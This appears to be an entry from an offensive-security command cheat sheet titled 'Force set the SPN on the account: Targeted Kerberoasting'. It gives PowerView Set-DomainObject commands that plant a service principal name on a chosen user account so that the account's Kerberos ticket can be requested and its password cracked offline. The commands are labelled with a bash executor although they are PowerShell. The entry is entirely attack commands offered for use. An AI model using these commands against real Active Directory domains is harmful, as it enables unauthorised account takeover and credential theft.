---
id: 8f438ec0-4a51-4ecc-86bc-22810d6d21f7
name: 'Force set the SPN on the account: Targeted Kerberoasting'
type: command
executor: bash
data: 'PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname=''ops/whatever1''}

  PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname=''any/thing''}'
output: null
created_at: '2023-04-06T03:56:06.700782+00:00'
updated_at: '2023-04-10T20:26:07.517652+00:00'
---

# Force set the SPN on the account: Targeted Kerberoasting

```bash
PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}
```
